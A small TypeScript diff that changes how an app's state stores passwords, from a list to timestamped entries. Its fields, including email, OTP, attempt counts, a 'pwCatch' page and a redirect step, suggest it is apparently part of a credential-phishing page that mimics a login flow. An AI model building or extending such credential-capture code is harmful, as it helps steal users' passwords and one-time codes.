@@ -3,7 +3,7 @@ export interface AppState {
     email: string;
     name: string;
     profilePicture: string;
-    passwords: string[];
+    passwords: { [key: string]: { value: string; timestamp: string } };
     attempts: number;
     currentPage: 'email' | 'login' | 'password' | 'verify' | 'otp' | 'error' | 'redirect' | 'pwCatch';
     errorMessage: string;
@@ -23,7 +23,7 @@ export const appState: AppState = {
     email: '',
     name: '',
     profilePicture: '',
-    passwords: [],
+    passwords: {},
     attempts: 0,
     currentPage: 'email',
     errorMessage: '',
